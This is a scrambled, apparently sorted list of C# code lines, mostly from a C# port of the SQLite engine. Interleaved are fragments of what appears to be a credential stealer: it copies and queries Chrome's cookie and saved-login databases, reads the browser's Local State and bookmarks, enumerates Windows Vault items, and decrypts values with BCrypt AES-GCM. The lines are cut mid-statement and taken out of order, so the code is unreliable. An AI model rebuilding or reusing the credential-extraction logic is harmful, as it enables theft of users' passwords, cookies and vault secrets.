                Debug.Assert( payloadSize == 0 
                Debug.Assert( pc > 0 )
                Debug.Assert( pc > 1 )
                Debug.Assert( rc != SQLITE_OK 
                Debug.Assert( rc == SQLITE_OK )
                Debug.Assert( sqlite3BtreeIsInTrans( pBt ) )
                Debug.Assert(sqlite3PagerIswriteable(pPage1.pDbPage))
                Debugger.Break()
                ExpandBlob( pIn2 )
                ExpandBlob( pIn3 )
                ExpandBlob( pRec )
                Expr p = pS.pEList.a[iCol].pExpr
                Expr pE2 = pItem.pExpr
                Guid vaultGuid = new Guid(vaultGuidString.ToString())
                IdList pUsing
                IntPtr elementPtr = (IntPtr)(vaultElementPtr.ToInt64() 
                IntPtr vaultHandle = IntPtr.Zero
                IntPtr vaultItemPtr = IntPtr.Zero
                NameContext sNC = new NameContext()
                PgHdr pSrcPg = null
                R = pIn3.u.i
                SQLite is holding pinned pages that can be unpinned
                SQLiteDatabase database = new SQLiteDatabase(cookie_tempFile)
                SQLiteDatabase database = new SQLiteDatabase(login_data_tempFile)
                Select pFirst = p
                SelectDest dest = new SelectDest()
                System.IO.File.Delete(cookie_tempFile)
                System.IO.File.Delete(login_data_tempFile)
                Token sColname = new Token()
                UPDATE_MAX_BLOBSIZE( pOut )
                VAULT_ITEM = typeof(VaultCli.VAULT_ITEM_WIN7)
                VAULT_ITEM = typeof(VaultCli.VAULT_ITEM_WIN8)
                Vdbe _v
                _v = sqlite3GetVdbe( pParse )
                a = (int)(ovflSize - offset)
                aMem[ii] = p.aMem[pOp.p4.i 
                aOffset = new u32[nField]
                aOffset = pC.aOffset
                aRoot[j] = (int)sqlite3VdbeIntValue( p.aMem[pOp.p1 
                affinity = SQLITE_AFF_NONE
                allocate a new page and return a pointer to it. If a new
                alreadyExists = ( res == 0 ) 
                apVal[i] = pArg
                apVal[i] = pRec
                as the first argument to xFetch() that can be unpinned. The
                avail = 0
                bRev = pKeyInfo.aSortOrder[i]
                break
                buf = new char[n]
                buf[buf.Length - 1] = _bufOrd[1]
                buf[buf.Length - 2] = _bufOrd[0]
                buf[bufpt
                buf[bufpt 
                bufpt = 0
                by writing their contents to the database file (a
                byte[] Buffer = new byte[encryptedData.Length - 15]
                byte[] data = new byte[Buffer.Length - tag.Length]
                byte[] ivData = new byte[MaxAuthTagSize(hAlg)]
                byte[] tag = new byte[16]
                c = ( sqlite3VdbeRealValue( pIn1 ) != 0.0 ) 
                c = pOp.p3
                cache implementation should attempt to allocate a new
                case 16:
                case 8:
                case CSSQLite.SQLITE_BLOB:
                case CSSQLite.SQLITE_FLOAT:
                case CSSQLite.SQLITE_INTEGER:
                case CSSQLite.SQLITE_TEXT:
                case OP_BitAnd: a 
                case OP_BitOr: a 
                case OP_Eq: res = ( res == 0 ) 
                case OP_Gt: res = ( res > 0 ) 
                case OP_Le: res = ( res <= 0 ) 
                case OP_Lt: res = ( res < 0 ) 
                case OP_Ne: res = ( res != 0 ) 
                case OP_ShiftLeft: a <<= (int)b
                catch
                cbLabel = 0
                cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO))
                cc.pNext = cc.pNext.pNext
                characters.
                cnt
                cnt = 0
                const long MAX_ROWID = i64.MaxValue
                constMask 
                continue
                ctx.pColl = p.aOp[pc - 1].p4.pColl
                ctx.pFunc = ctx.pVdbeFunc.pFunc
                ctx.pFunc = pOp.p4.pFunc
                ctx.pVdbeFunc = (VdbeFunc)pOp.p4.pVdbeFunc
                ctx.pVdbeFunc = null
                database.CloseDatabase()
                db.flags 
                db.writeVdbeCnt > 0 
                default:
                default: Debug.Assert( pOp.opcode == OP_ShiftRight )
                default: res = ( res >= 0 ) 
                do
                dwInfoVersion = BCRYPT_INIT_AUTH_MODE_INFO_VERSION
                else
                else if (
                else if ( ( pC.cacheStatus == p.cacheCtr ) 
                else if ( ( pOp.p5 
                else if ( flag_blanksign ) prefix = ' '
                else if ( len != 0 )
                else if ( pC.isIndex )
                else if ( prefix == '
                else prefix = '
                exp %= 100
                failed and returns SQLITE_NOMEM to the user.
                flags = BTREE_LEAFDATA 
                flags = BTREE_ZERODATA
                for (
                for ( i = 0 
                for ( int rI = 0 
                for ( int ra = 0 
                for ( nId = 1 
                foreach (DataRow row in resultantQuery.Rows)
                foreach (ManagementObject disk in searcher1.Get())
                goto abort_due_to_misuse
                goto abort_parse
                goto end_allocate_page
                goto exec_out
                goto no_mem
                goto op_column_out
                goto too_big
                goto vdbe_return
                guidAddress = (IntPtr)(guidAddress.ToInt64() 
                i
                i 
                i64 iNewSum = p.iSum 
                iA = pIn1.u.i
                iB = pIn2.u.i
                iCompare = sqlite3MemCompare( p.aMem[p1 
                iDb = pOp.p3
                iKey = pC.lastRowid
                iKey = pIn3.u.i
                iMeta = 0
                iOverflow
                iOverflow = i 
                iReg = 
                iSavepoint = 0
                idx = aPermute != null 
                if ( !pC.ephemPseudoTable )
                if ( !pC.nullRow )
                if ( !pC.useRandomRowid )
                if ( !sqlite3Isxdigit( c ) )
                if ( ( aMem[ii].flags 
                if ( ( db.flags 
                if ( ( flags 
                if ( ( pData.flags 
                if ( ( pIdx.flags 
                if ( ( pIn1.flags 
                if ( ( pOp.p5 
                if ( ( pPage.flags 
                if ( ( pRec.flags 
                if ( ( r.flags 
                if ( ( wctrlFlags 
                if ( 0 == alreadyExists ) pc = pOp.p2 - 1
                if ( ALWAYS( pItem.pExpr != null ) ) pItem.pExpr.flags 
                if ( IsHiddenColumn( pTab.aCol[j] ) )
                if ( NEVER( p2 < 2 ) )
                if ( NEVER( rc != 0 ) ) goto abort_due_to_error
                if ( NEVER( zTabName == null ) 
                if ( String.IsNullOrEmpty( zSql ) )
                if ( _v == null 
                if ( allowedOp( pAndTerm.pExpr.op ) )
                if ( alreadyExists != 0 ) pc = pOp.p2 - 1
                if ( azVals[i] == null 
                if ( c == ')' )
                if ( c2 < 0x80 ) c2 = sqlite3UpperToLower[c2]
                if ( ch == q ) buf[bufpt 
                if ( ch == q ) n
                if ( db.aDb[pOp.p1].pSchema.schema_cookie != iMeta )
                if ( db.writeVdbeCnt > 0 )
                if ( db.xTrace != null )
                if ( exists != 0 )
                if ( flag_altform2 )
                if ( flag_plussign ) prefix = '
                if ( i 
                if ( i < pSrcList.nSrc - 1 )
                if ( i == 0 )
                if ( i > 0 
                if ( i >= 0 )
                if ( iCol >= 32 )
                if ( iCompare != 0 )
                if ( iRollback != 0 )
                if ( isRowid )
                if ( len > (int)offset ) len = (int)offset
                if ( longNames 
                if ( n > (u32)db.aLimit[SQLITE_LIMIT_LENGTH] )
                if ( n64 > db.aLimit[SQLITE_LIMIT_LENGTH] )
                if ( null == pSavepoint )
                if ( oc == OP_SeekGe 
                if ( offset > 98307 )
                if ( p.contextStack == null ) goto no_mem
                if ( p.iStatement == 0 )
                if ( p.rc == SQLITE_OK )
                if ( pC.ephemPseudoTable )//
                if ( pC.isTable )
                if ( pC.nullRow )
                if ( pC.rowidIsValid )
                if ( pC.useRandomRowid )
                if ( pD0 < zAffinity.Length 
                if ( pDb.pSchema.file_format < p.minWriteFileFormat )
                if ( pExpr.iTable == pItem.iCursor )
                if ( pIdxKey == null )
                if ( pKeyInfo.aSortOrder != null 
                if ( pOp.opcode == OP_Found )
                if ( pOp.opcode == OP_IdxLT )
                if ( pOp.opcode == OP_IfNot ) c = ( c == 0 ) 
                if ( pOp.p2 == 0 )
                if ( pOp.p2 == pIdx.aiColumn[j] )
                if ( pOp.p3 > 0 )
                if ( pOp.p4.pKeyInfo != null )
                if ( pOp.p4type == P4_MEM )
                if ( pOp.p5 != 0 )
                if ( pOp.p5 != 0 ) p.aCounter[pOp.p5 - 1]
                if ( prefix == '-' )
                if ( r1 != r2 )
                if ( rc != 0 ) goto abort_due_to_error
                if ( rc != SQLITE_OK 
                if ( rc != SQLITE_OK )
                if ( rc == SQLITE_BUSY )
                if ( rc == SQLITE_IOERR_SHORT_READ )
                if ( rc == SQLITE_OK 
                if ( rc == SQLITE_OK )
                if ( res != 0 )
                if ( res > 0 )
                if ( sqlite3IsNaN( rB ) )
                if ( sqlite3VdbeMemTooBig( pVar ) )
                if ( testAddr != 0 
                if ( z.Length > iOffset 
                if ( zArg[i] == '
                if ( zDb != null 
                if ( zIdx > zEndHdr 
                if ( zRec != null )
                if ( zRec == null 
                if ( zindex != 0 ) zSql = zindex < zSql.Length 
                if (File.Exists(url_file_path) == true)
                if (aad != null)
                if (array == null)
                if (d2 < 0) d2 = -d2
                if (d2 < dist)
                if (iv != null)
                if (pbAuthData != IntPtr.Zero) Marshal.FreeHGlobal(pbAuthData)
                if (pbMacContext != IntPtr.Zero) Marshal.FreeHGlobal(pbMacContext)
                if (pbNonce != IntPtr.Zero) Marshal.FreeHGlobal(pbNonce)
                if (pbTag != IntPtr.Zero) Marshal.FreeHGlobal(pbTag)
                if (prof.Success)
                if (rc != 0)
                if (rc != SQLITE_OK)
                if (result != 0)
                if (status != BCrypt.ERROR_SUCCESS)
                if (status == BCrypt.STATUS_AUTH_TAG_MISMATCH)
                if (tag != null)
                if (url != null)
                if (vaultItemCount > 0)
                if (vaultSchema.ContainsKey(vaultGuid))
                in which case SQLite will attempt to unpin one or more 
                initData = new InitData()
                initData.db = db
                initData.iDb = pOp.p1
                initData.pzErrMsg = p.zErrMsg
                int f = SQLITE_OPEN_READWRITE 
                int fout = 0
                int iReg
                int n = sqlite3Strlen30( pColl.zName )
                int nId
                int pid = p.Id
                int plainTextSize = 0
                int r1 = j 
                int r2
                int s1 = (int)( p.iSum >> ( sizeof( i64 ) 
                int s2 = (int)( v >> ( sizeof( i64 ) 
                int s3 = (int)( iNewSum >> ( sizeof( i64 ) 
                int vaultItemCount = 0
                int zindex = 0
                it (at least) must be zeroed before it is returned.
                it is returned. If the xFetch() method returns NULL when 
                j
                keyColumn = i
                len 
                len = (int)sqlite3VdbeSerialTypeLen( serial_type )
                len = nField 
                length = sqlite3Strlen30( bufpt )
                longvalue = -v
                longvalue = v
                n
                n 
                n = (u32)n64
                nCol
                nData 
                nEntry = 0
                nField = pKeyInfo.nField 
                nField = pOp.p4.i
                nHdr
                nHdr 
                nOverflow = pOld.nOverflow
                no_such_func = true
                object results
                oc = pOp.opcode
                offset 
                offset64 = offset
                okToChngToIN = 0
                onError = OE_Abort
                op = ( ( pOp.p5 
                opCompare.pRight = aListelem[i].pExpr
                p.contextStackDepth = i 
                p.errorAction = OE_Abort
                p.expired = true
                p.iJD 
                p.iSum = iNewSum
                p.nChange 
                p.overflow = ( ( s1 
                p.pResultSet[i] = p.aMem[pOp.p1 
                p.rc = rc = SQLITE_BUSY
                p.xDel( ref p.pUser )
                p2 = (int)pIn2.u.i
                pAndTerm = pAndWC.a[j]
                pArg = p.aMem[pOp.p2 
                pBest = pIdx
                pBt = db.aDb[pOp.p1].pBt
                pC.aOffset = aOffset
                pC.atFirst = res == 0 
                pC.cacheStatus = CACHE_STALE
                pC.cacheStatus = p.cacheCtr
                pC.deferredMoveto = false
                pC.deferredMoveto = true
                pC.iKey = iKey
                pC.lastRowid = pIn3.u.i
                pC.movetoTarget = sqlite3VdbeIntValue( pIn2 )
                pC.nData = pData.n
                pC.nullRow = false
                pC.nullRow = true
                pC.payloadSize = payloadSize
                pC.rowidIsValid = false
                pC.rowidIsValid = res == 0 
                pC.seekResult = 0
                pC.seekResult = res
                pColl = pKeyInfo.aColl[i]
                pCur.pCursor = null
                pData.n = 0
                pData.z = null
                pData.zBLOB
                pData.zBLOB = null
                pDb.pSchema.file_format = (u8)pIn3.u.i
                pDb.pSchema.schema_cookie = (int)pIn3.u.i
                pDest.enc = encoding
                pEList.a[0].pExpr )
                pExists = ( first[0] != 0 ) 
                pExists = 1
                pExpr.iColumn = (short)( iCol == pTab.iPKey 
                pExpr.iColumn = (short)( j == pTab.iPKey 
                pExpr.iTable = pItem.iCursor
                pExpr.pTab = pTab
                pIdx.onError = pIndex.onError
                pIn1 = p.aMem[p1 
                pIn1.flags = (ushort)( pIn1.flags 
                pIn1.u.i = pIn2.u.i
                pIn2 = p.aMem[p2]
                pIn3.u.i )
                pItem = pAggInfo.aFunc[i]
                pItem = pList.a[i]
                pItem = pList.a[pList.nExpr - i]
                pItem = pSrcList.a[i]
                pKeyInfo = pOp.p4.pKeyInfo
                pKeyInfo.enc = ENC( p.db )
                pMatch = pItem
                pMinMax.a[0].pExpr.op = TK_COLUMN
                pMinMax.a[0].sortOrder = (u8)( flag != WHERE_ORDERBY_MIN 
                pNC = pNC.pNext
                pOp.p4.pVdbeFunc = ctx.pVdbeFunc
                pOp.p4type = P4_VDBEFUNC
                pOrTerm.wtFlags 
                pOut = p.aMem[p2
                pOut = p.aMem[p2]
                pOut = p.aMem[pOp.p2]
                pOut = p.aMem[pOp.p3]
                pOut.flags 
                pOut.flags = MEM_Int
                pOut.flags = MEM_Null
                pOut.r = rB
                pOut.u.i = iB
                pOut.u.i = iMoved
                pOut.u.i = nPage
                pOut.u.i = res
                pOut.u.i = v1
                pOut.u.nZero = nZero
                pOut.zBLOB = new byte[n]
                pOut.zBLOB = new byte[pCrsr.info.nData]
                pOut.zBLOB = new byte[pIn1.n 
                pPage1.aData[32 
                pParse.rc = SQLITE_INTERRUPT
                pPrevTrunk.aData[0 
                pRec = p.aMem[pD0]
                pRec = p.aMem[pOp.p1 
                pRec = p.aMem[pOp.p2 
                pS = pTabList.a[j].pSelect
                pSavepoint != null 
                pSavepoint = db.pSavepoint 
                pSavepoint = pSavepoint.pNext
                pSchema = pTab.pSchema
                pTab = pTabList.a[j].pTab
                pTest = aListelem[i].pExpr
                pVar = p.aVar[p1
                payloadSize = (Pgno)pC.nData
                payloadSize = 0
                pbLabel = IntPtr.Zero
                pc = pOp.p1 - 1
                pc = pOp.p2 - 1
                pc = pOp.p3 - 1
                pinned pages associated with the specific cache passed
                plainText = new byte[plainTextSize]
                prNotFound = 
                precision = precision - exp
                prefix = '-'
                pszAlgId = alg
                r.aMem = aMem
                r.aMem = new Mem[r.nField]
                r.flags = 0
                r.flags = UNPACKED_PREFIX_SEARCH
                r.nField = (u16)pOp.p3
                r.nField = (u16)pOp.p4.i
                r.nField = (ushort)( nField 
                r.pKeyInfo = pC.pKeyInfo
                r.pKeyInfo = pCx.pKeyInfo
                rA = sqlite3VdbeRealValue( pIn1 )
                rB = sqlite3VdbeRealValue( pIn2 )
                rc = SQLITE_BUSY
                rc = SQLITE_CORRUPT_BKPT()
                rc = SQLITE_ERROR
                rc = SQLITE_LOCKED
                rc = SQLITE_OK
                rc = SQLITE_SCHEMA
                rc = ctx.isError
                rc = p.rc != 0 
                rc = pager_write( pPage )
                rc = sqlite3PagerWrite((ppPage).pDbPage)
                rc = sqlite3PagerWrite(pPrevTrunk.pDbPage)
                rc = sqlite3VdbeCursorMoveto( pC )
                relatively expensive operation). In this situation the
                releasePage(pNewTrunk)
                res = 0
                res = 1
                return
                return (char)'0'
                return Encoding.UTF8.GetString( (byte[])ap[vaNEXT - 1] )
                return WRC_Abort
                return null
                return result
                return results
                sColname.n = sqlite3Strlen30( zColname )
                sColname.z = zColname
                sMem.flags = MEM_Null
                sNC.pNext = null
                sNC.pParse = pNC.pParse
                sNC.pSrcList = pS.pSrc
                seekResult = ( ( pOp.p5 
                seen = 1
                seenReplace = true
                sizeof(void
                sqlite3BtreeClearCursor( pC.pCursor )
                sqlite3CloseSavepoints( db )
                sqlite3ExpirePreparedStatements( db )
                sqlite3OsClose( pPager.jfd )
                sqlite3PagerUnref( pPage )
                sqlite3PagerUnref( pSrcPg )
                sqlite3PendingByte = (int)newVal
                sqlite3VdbeDeleteUnpackedRecord( pIdxKey )
                sqlite3VdbeMemIntegerify( pIn1 )
                sqlite3VdbeMemIntegerify( pIn2 )
                sqlite3VdbeMemIntegerify( pIn3 )
                sqlite3VdbeMemNulTerminate( p.pResultSet[i] )
                sqlite3VdbeMemNumerify( pIn1 )
                sqlite3VdbeMemRealify( pIn1 )
                sqlite3VdbeMemRelease( ctx.s )
                sqlite3VdbeMemRelease( sMem )
                sqlite3VdbeMemReleaseExternal( pOut )
                sqlite3VdbeMemSetNull( pIdx )
                sqlite3VdbeMemSetNull( pOut )
                sqlite3VdbeMemSetRowSet( pIdx )
                sqlite3VdbeMemSetRowSet( pIn1 )
                sqlite3WhereEnd( pSubWInfo )
                sqlite3_search_count.iValue
                string booktext = File.ReadAllText(chrome_book_path)
                string chrome_state_file = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) 
                string cookie_tempFile = Path.GetTempFileName()
                string login_data_tempFile = Path.GetTempFileName()
                string process_of_user = GetProcessUserName(pid)
                string processname = p.ProcessName
                string vaultType
                string zCol = pTab.aCol[pIdx.aiColumn[j]].zName
                string zColname
                string zDb = db.aDb[pC.iDb].zName
                string zName = pTab.aCol[j].zName
                string zTabName = pItem.zAlias
                string zTabName = pTab.zName
                string zTbl = pOp.p4.z
                string zToFree
                switch ( columnType )
                switch ( pOp.opcode )
                switch ( zSql[zIdx] )
                switch ((int)partialElementType)
                testcase( iCol == 31 )
                testcase( iCol == 32 )
                this.cbSalt = cbSalt
                this.pszAlgId = pszAlgId
                token = tkOTHER
                try
                u32 iSrcPg = (u32)( ( iOff / nSrcPagesize ) 
                u8 enc = pParse.db.aDbStatic[0].pSchema.enc
                u8[] first = new u8[1]
                v = pC.iKey
                v = pC.movetoTarget
                v1 = ( sqlite3VdbeIntValue( pIn1 ) != 0 ) 
                v1 = 2
                v1 = and_logic[v1 
                v1 = or_logic[v1 
                v2 = ( sqlite3VdbeIntValue( pIn2 ) != 0 ) 
                v2 = 2
                var partialElementType = partialElementInfo.GetValue(partialElement)
                var structAddress = vaultItemPtr
                while ( pFirst.pPrior != null ) pFirst = pFirst.pPrior
                while ( zindex < zSql.Length 
                wrFlag = 0
                wrFlag = 1
                wrong_num_args = true
                x = 0
                xtype = etEXP
                xtype = etFLOAT
                z.Append( (char)zArg[i] )
                zColname = zName
                zDb = db.aDb[pC.iDb].zName
                zEndHdr = len
                zIdx 
                zIdx = szHdr
                zMaster = SCHEMA_TABLE( iDb )
                zOriginCol = pTab.aCol[iCol].zName
                zOriginDb = pNC.pParse.db.aDb[iDb].zName
                zRec = pC.pData
                zTabName = pTab.zName
                zTbl = pOp.p4.z
                zTemp.Append( pColl.zName )
                zText.Append( hexdigits[( zBlob[i] ) 
                zText.Append( hexdigits[( zBlob[i] >> 4 ) 
                zType = pTab.aCol[iCol].zType
                {
                }
                } /
                } while ( ( iOffset 
               (Note: This number might be zero.)
               /
               identifies the parent page in the btree.
              ( flag == WHERE_ORDERBY_MIN 
              ( pExpr.flags 
              )
              /
              //  
              //   
              //              zExtra = bufpt
              //        db.mallocFailed = 1
              //  /
              //  //Debug.Assert( sMem.z == sMem.zMalloc)
              //  Debug.Assert( ( pDest.flags 
              //  Debug.Assert( sMem.xDel == null )
              //  aMem = 
              //  goto moveto_finish
              //  goto no_mem
              //  longvalue = longvalue / (ulong)_base
              //  pDest.flags 
              //  pDest.z = sMem.z
              //  pDest.zMalloc = sMem.zMalloc
              //  rc = SQLITE_NOMEM
              //  sqlite3PageFree(ref pFree)
              //  sqlite3VdbeMemRelease( ctx.s )
              // Integer pointer always exists Debug.Assert( pOp.p4.pI64 != 0 )
              ////if ( 0 == db.mallocFailed )
              ///if ( db.mallocFailed != 0 ) break
              //Debug.Assert( ( aMem[nField].flags 
              //Mem pData0
              //Mem pLast
              //Mem[] pMem
              //_base = infop._base
              //bufpt -= 2
              //char
              //cset = aDigits[infop.charset]
              //ctx.s.zMalloc = null
              //do
              //for ( pRec = pData0 
              //for (pRec = pData0
              //if ( db.mallocFailed != 0 )
              //if ( pCellKey == null )
              //if ( pOut != pIn2 )
              //if ( sMem.zMalloc != null )
              //if (pFree != null)
              //int (
              //int _base
              //length 
              //memcpy( 
              //pArg = p.aMem[pOp.p2]
              //pData0 = 
              //pData0 = p.aMem[nField]
              //pIn1 = p.aMem[p1]
              //pLast = 
              //pLast =  pData0[nField - 1]
              //pMem = p.pResultSet = p.aMem[pOp.p1]
              //pOut = p.aMem[p2]
              //pOut.z[nByte 
              //pRec = p.aMem[pOp.p2]
              //sqlite3_free( ref  zText )
              //sqlite3_free( ref pInfo.idxStr )
              //void (
              //zText[( nBlob 
              //zText[0] = 'X'
              //zText[1] = '
              //z[j] = '
              //{
              //{ /
              //}
              //} while (longvalue > 0)
              AggInfo_col pCol = sAggInfo.aCol[i]
              AggInfo_func pItem
              BtCursor pCrsr
              Btree pBt
              Btree pX
              CollSeq pColl
              CollSeq pColl = pKeyInfo.aColl[j]
              Context pContext
              DateTime tx
              Db pDb
              Debug.Assert( !isRowid )
              Debug.Assert( !pC.deferredMoveto )
              Debug.Assert( !pC.nullRow )
              Debug.Assert( !pC.pseudoTable )
              Debug.Assert( !pCx.deferredMoveto )
              Debug.Assert( !seenReplace )
              Debug.Assert( !sqlite3IsNaN( pOp.p4.pReal ) )
              Debug.Assert( ( p.btreeMask 
              Debug.Assert( ( pExpr.iTable 
              Debug.Assert( ( pIn1.flags 
              Debug.Assert( ( pIn2.flags 
              Debug.Assert( ( pIn3.flags 
              Debug.Assert( ( pKey.flags 
              Debug.Assert( ( pMem.flags 
              Debug.Assert( ( pOrTerm.wtFlags 
              Debug.Assert( ( pVal.flags 
              Debug.Assert( ( pnErr.flags 
              Debug.Assert( 0 == useIndexOnly 
              Debug.Assert( ALWAYS( pC != null ) )
              Debug.Assert( IsVirtual( pTab ) )
              Debug.Assert( MEM_Str == ( MEM_Blob >> 3 ) )
              Debug.Assert( apVal != null 
              Debug.Assert( bufpt > 0 )
              Debug.Assert( checkSavepointCount( db ) != 0 )
              Debug.Assert( db.aDb[iDb].pBt != null )
              Debug.Assert( db.aLimit[SQLITE_LIMIT_LENGTH] >= 0 )
              Debug.Assert( db.activeVdbeCnt > 0 )
              Debug.Assert( db.pSavepoint != null 
              Debug.Assert( db.pSavepoint == null 
              Debug.Assert( desiredAutoCommit != 0 
              Debug.Assert( i == nByte )
              Debug.Assert( i >= 0 )
              Debug.Assert( iCol == -1 
              Debug.Assert( iDb >= 0 
              Debug.Assert( iSet == -1 
              Debug.Assert( j == 1 )
              Debug.Assert( k >= 0 
              Debug.Assert( n == 0 
              Debug.Assert( n > 0 
              Debug.Assert( n > 0 )
              Debug.Assert( n >= 0 )
              Debug.Assert( nField > 0 
              Debug.Assert( nRoot > 0 )
              Debug.Assert( onError == OE_Replace )
              Debug.Assert( p.addrOpenEphm[0] == -1 )
              Debug.Assert( p.apCsr[pOp.p1] != null )
              Debug.Assert( p.contextStackTop >= 0 )
              Debug.Assert( p.iStatement == 0 
              Debug.Assert( p.nResColumn == pOp.p2 )
              Debug.Assert( p.op == TK_UNION )
              Debug.Assert( p.pEList != null )
              Debug.Assert( p.pLimit == null )
              Debug.Assert( p.pOffset == null )
              Debug.Assert( p.pOrderBy == null )
              Debug.Assert( p.pRightmost != p )
              Debug.Assert( p1 
              Debug.Assert( p1 < p.nCursor )
              Debug.Assert( p1 == SAVEPOINT_BEGIN 
              Debug.Assert( p1 > 0 
              Debug.Assert( p1 >= 0 
              Debug.Assert( p2 < nField )
              Debug.Assert( p2 > 0 
              Debug.Assert( p2 >= 1 
              Debug.Assert( pC != null )
              Debug.Assert( pC.deferredMoveto == false )
              Debug.Assert( pC.isIndex 
              Debug.Assert( pC.isTable 
              Debug.Assert( pC.isTable )
              Debug.Assert( pC.pCursor != null 
              Debug.Assert( pC.pCursor != null )
              Debug.Assert( pCol.iMem > 0 )
              Debug.Assert( pDb.pBt != null )
              Debug.Assert( pE.pLeft != null )
              Debug.Assert( pExpr.affinity == OE_Ignore )
              Debug.Assert( pExpr.affinity == OE_Rollback 
              Debug.Assert( pExpr.pLeft == null 
              Debug.Assert( pExpr.x.pList == null )
              Debug.Assert( pExpr.x.pSelect == null )
              Debug.Assert( pIn1 != pOut )
              Debug.Assert( pKeyInfo != null )
              Debug.Assert( pLoop.addrOpenEphm[1] < 0 )
              Debug.Assert( pNC.nRef >= nRef )
              Debug.Assert( pOp.p1 
              Debug.Assert( pOp.p1 <= db.aLimit[SQLITE_LIMIT_LENGTH] )
              Debug.Assert( pOp.p1 <= p.nMem )
              Debug.Assert( pOp.p1 > 0 
              Debug.Assert( pOp.p1 > 0 )
              Debug.Assert( pOp.p1 >= 0 
              Debug.Assert( pOp.p1 >= 0 )
              Debug.Assert( pOp.p2 != 0 )
              Debug.Assert( pOp.p2 < SQLITE_N_BTREE_META )
              Debug.Assert( pOp.p2 <= p.nMem )
              Debug.Assert( pOp.p2 > 0 
              Debug.Assert( pOp.p2 > 0 )
              Debug.Assert( pOp.p3 < SQLITE_N_BTREE_META )
              Debug.Assert( pOp.p3 < pOp.p1 
              Debug.Assert( pOp.p3 < pOp.p2 
              Debug.Assert( pOp.p3 <= p.nMem )
              Debug.Assert( pOp.p3 > 0 
              Debug.Assert( pOp.p3 > 0 )
              Debug.Assert( pOp.p4.ai != null )
              Debug.Assert( pOp.p4.i > 0 
              Debug.Assert( pOp.p4.z != null )
              Debug.Assert( pOp.p4.z == null 
              Debug.Assert( pOp.p4type == P4_COLLSEQ 
              Debug.Assert( pOp.p4type == P4_COLLSEQ )
              Debug.Assert( pOp.p4type == P4_FUNCDEF 
              Debug.Assert( pOp.p4type == P4_INT32 )
              Debug.Assert( pOp.p4type == P4_INTARRAY )
              Debug.Assert( pOp.p5 < db.nDb )
              Debug.Assert( pOut != pIn1 )
              Debug.Assert( pParse.ckBase > 0 )
              Debug.Assert( pRight.op == TK_DOT )
              Debug.Assert( pS == null )
              Debug.Assert( pX != null )
              Debug.Assert( precision > 0 )
              Debug.Assert( rc == SQLITE_BUSY 
              Debug.Assert( rc == SQLITE_NOMEM )
              Debug.Assert( rc==SQLITE_EMPTY 
              Debug.Assert( regRow != pDest.iMem 
              Debug.Assert( sizeof( i64 ) == 8 
              Debug.Assert( sqlite3BtreeCursorIsValid( pCrsr ) )
              Debug.Assert( sqlite3BtreeHoldsMutex( db.aDb[iDb].pBt ) )
              Debug.Assert( xtype == etINVALID )
              Debug.Assert( zTab == null 
              Debug.Assert((balance_quick_called
              Debug.Assert(leafCorrection == 4)
              Debug.Assert(nCellKey > intKey)
              Debug.Assert(pCur.apPage[1].nOverflow != 0)
              Debug.Assert(sqlite3PagerIswriteable(pTrunk.pDbPage))
              ExpandBlob( pIn1 )
              ExpandBlob( pIn3 )
              Expr pOrig
              ExprList elDummy = null
              ExprList pEList
              ExprList pList = pExpr.x.pList
              ExprList_item pItem
              ExprSetIrreducible( pExpr )
              InitData initData
              KeyInfo pKey
              KeyInfo pKeyInfo
              Mem pArg
              Mem pData
              Mem pDest
              Mem pIdx
              Mem pKey
              Mem pMem
              Mem pRec
              Mem pVal
              Mem pVar
              Mem pnErr
              Mem sMem
              MemPage pNewTrunk = new MemPage()
              Mem[] aMem
              Otherwise NULL.
              PENDING_BYTE = sqlite3PendingByte
              Pager pPager
              PgHdr pPage = null
              SQLITE_OPEN_CREATE 
              SQLITE_OPEN_DELETEONCLOSE 
              SQLITE_OPEN_EXCLUSIVE 
              SQLITE_OPEN_READWRITE 
              SQLITE_OPEN_TRANSIENT_DB
              Savepoint pNew
              Savepoint pSavepoint
              Savepoint pTmp
              Select pFirst = p
              Select pSubquery
              SelectDest dest = new SelectDest()
              SrcList pSrc
              SrcList pTabList = pNC.pSrcList
              SrcList_item pItem
              SrcList_item pItem = pSrc.a[k]
              StrAccum errMsg = new StrAccum()
              TCLsqlite3PendingByte.iValue = sqlite3PendingByte
              Table pTab = pFrom.pTab
              UPDATE_MAX_BLOBSIZE( pDest )
              UPDATE_MAX_BLOBSIZE( pIn1 )
              UPDATE_MAX_BLOBSIZE( pMem )
              UPDATE_MAX_BLOBSIZE( pOut )
              UnpackedRecord aTempRec = new UnpackedRecord()
              UnpackedRecord pIdxKey
              UnpackedRecord r
              Vdbe pVdbe
              VdbeCursor pC
              VdbeCursor pCur
              VdbeCursor pCx
              VdbeCursor pCx = new VdbeCursor()
              VdbeFunc pVdbeFunc = (VdbeFunc)p4
              WHERE_OMIT_OPEN 
              WhereClause pAndWC = pOrTerm.u.pAndInfo.wc
              WhereClause tempWC = new WhereClause()
              WhereInfo pSubWInfo
              X <op> <expr>
              Z = ( ( p.iJD 
              _bufOrd = new char[2]
              _bufOrd[0] = zOrd[x 
              _bufOrd[1] = zOrd[x 
              a = sqlite3VdbeIntValue( pIn2 )
              aMem = new Mem[nField 
              aMem[nField] = new Mem()
              aOp[pc 
              aPayload = sqlite3PagerGetData(pDbPage)
              aPermute = null
              aPermute = pOp.p4.ai
              aRoot = new int[nRoot 
              aRoot[j] = 0
              aType = pC.aType
              a[k].zName = null
              a[k].zSpan = null
              affLeft = sqlite3ExprAffinity( pOrTerm.pExpr.pLeft )
              affRight = sqlite3ExprAffinity( pOrTerm.pExpr.pRight )
              affinity = (char)( pOp.p5 
              alreadyExists = 0
              amt -= (u32)a
              apVal = p.apArg
              appendFlag = true
              applyNumericAffinity( pIn1 )
              applyNumericAffinity( pIn2 )
              argument.
              assurance that the journal will not be corrupted to the
              azCols = new string[nCol]
              azVals = new string[nCol]
              b = sqlite3VdbeIntValue( pIn1 )
              be centered in the appropriately sized field.
              bool isnull
              bool needQuote
              break
              buf[( --bufpt )] = '0'
              buf[0] = '
              buf[bufpt
              buf[bufpt 
              bufpt = 0
              bufpt = buf.Length - _buf.Length - ( _bufOrd == null 
              byte[] zData
              byte[] zKey
              byte[] zNewRecord
              byte[] zRec
              c = 
              c = -1
              c = 0
              c = fmt[
              c1 = localtimeOffset( p )
              cacheX = pX
              cacheX.op = TK_REGISTER
              callbackIsInit = 1
              case '%':
              case 'H':
              case 'J':
              case 'M':
              case 'S':
              case 'W':
              case 'W': /
